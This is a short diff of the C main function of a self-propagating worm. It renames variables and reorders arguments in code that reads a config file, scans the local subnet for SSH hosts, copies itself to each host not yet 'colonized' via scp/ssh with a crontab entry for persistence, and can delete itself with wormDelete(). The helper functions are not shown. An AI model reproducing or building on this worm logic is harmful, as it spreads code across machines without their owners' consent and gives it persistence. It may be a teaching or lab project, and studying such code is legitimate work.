@@ -5,7 +5,7 @@ int main (int argc, char **argv) {
 	char programPath[PATH_MAX];
 	dictionary *dico;
 	struct in_addr adminHost;
-	char *programName, *ip, *command, *control, *targetPath, *crontab, *scp, *ssh, *broadcast;
+	char *programName, *adminIP, *command, *control, *dstPath, *crontab, *scpPath, *sshPath, *broadcast;
 	struct in_addr *hostList = NULL;
 
 	// get real path of the program
@@ -19,30 +19,30 @@ int main (int argc, char **argv) {
 
 	// read and check the configuration file
 	dico = GetConfig();
-	ip = iniparser_getstring(dico, "Administrator:ip", NULL);
+	adminIP = iniparser_getstring(dico, "Administrator:ip", NULL);
 	command = iniparser_getstring(dico, "Administrator:command", NULL);
 	control = iniparser_getstring(dico, "Target:control", NULL);
-	targetPath = iniparser_getstring(dico, "Target:targetPath", NULL);
+	dstPath = iniparser_getstring(dico, "Target:targetPath", NULL);
 	crontab = iniparser_getstring(dico, "Target:crontab", NULL);
-	scp = iniparser_getstring(dico, "Network:scp", NULL);
-	ssh = iniparser_getstring(dico, "Network:ssh", NULL);
+	scpPath = iniparser_getstring(dico, "Network:scp", NULL);
+	sshPath = iniparser_getstring(dico, "Network:ssh", NULL);
 	portSSH = iniparser_getint(dico, "Network:portSSH", -1);
 	broadcast = iniparser_getstring(dico, "Network:broadcast", NULL);
 
 	// if the user is root
 	if (isRoot()) {
 		// if the host is the administrator
-		if(isSourceHost(ip)) {
-			hostList = scanNetwork(ip, broadcast, portSSH);
-			inet_aton(ip, &adminHost);
+		if(isSourceHost(adminIP)) {
+			hostList = scanNetwork(adminIP, broadcast, portSSH);
+			inet_aton(adminIP, &adminHost);
 			cpt = 0;
 			while (1) {
 				// if the target host and the administrator host are in the same subnet
 				if (inet_netof(hostList[cpt]) == inet_netof(adminHost)) {
 					// if the host is not colonized
-					if (!isAlreadyColonized(inet_ntoa(hostList[cpt]), programName, ssh, portSSH, targetPath)) {
+					if (!isAlreadyColonized(inet_ntoa(hostList[cpt]), programName, sshPath, portSSH, dstPath)) {
 						// colonize the host
-						colonize(inet_ntoa(hostList[cpt]), programPath, ssh, portSSH, scp, targetPath, crontab);
+						colonize(inet_ntoa(hostList[cpt]), sshPath, portSSH, scpPath, programPath, dstPath, crontab);
 					}
 				}
 				else
@@ -57,7 +57,7 @@ int main (int argc, char **argv) {
 			}
 			else {
 				// delete program, configuration file and restore crontab
-				wormDelete(programName, targetPath, crontab);
+				wormDelete(programName, dstPath, crontab);
 			}
 		}
 	}
